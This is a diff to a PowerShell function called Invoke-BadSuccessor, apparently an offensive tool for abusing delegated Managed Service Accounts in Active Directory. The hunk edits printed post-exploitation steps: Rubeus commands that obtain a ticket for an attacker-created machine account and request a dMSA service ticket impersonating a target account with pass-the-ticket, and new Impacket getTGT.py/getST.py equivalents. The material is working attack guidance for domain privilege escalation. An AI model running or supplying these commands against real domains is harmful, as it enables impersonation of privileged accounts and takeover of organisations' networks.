@@ -685,13 +685,20 @@ function Invoke-BadSuccessor {
     }
 
     # 7. Rubeus post-exploitation tips (skip if quiet)
+# 7. Post-exploitation tips (skip if quiet)
     if (-not $Quiet) {
         $domain = (Get-ADDomain).DNSRoot
+        
         Write-Host ""
         Write-Host "[+] Next steps (Rubeus):" -ForegroundColor Cyan
         Write-Host "    Rubeus.exe hash /password:'$Password' /user:$($machine.SamAccountName) /domain:$domain"
-        Write-Host "    Rubeus.exe asktgt /user:$($machine.SamAccountName) /aes256:<AES256KEY> /domain:$domain /nowrap"
+        Write-Host "    Rubeus.exe asktgt /user:$($machine.SamAccountName) /aes256:<AES256KEY> /domain:$domain"
         Write-Host "    Rubeus.exe asktgs /targetuser:$($service.SamAccountName) /service:krbtgt/$domain /dmsa /opsec /ptt /nowrap /outfile:ticket.kirbi /ticket:<BASE64TGT>"
+    
+        Write-Host ""
+        Write-Host "[+] Alternative (Impacket):" -ForegroundColor Cyan
+        Write-Host "    getTGT.py '$domain/$($machine.SamAccountName):$Password'"
+        Write-Host "    KRB5CCNAME=$($machine.SamAccountName).ccache getST.py '$domain/$($machine.SamAccountName)' -k -no-pass -dmsa -self -impersonate '$($service.SamAccountName)'"
     }
 }
 
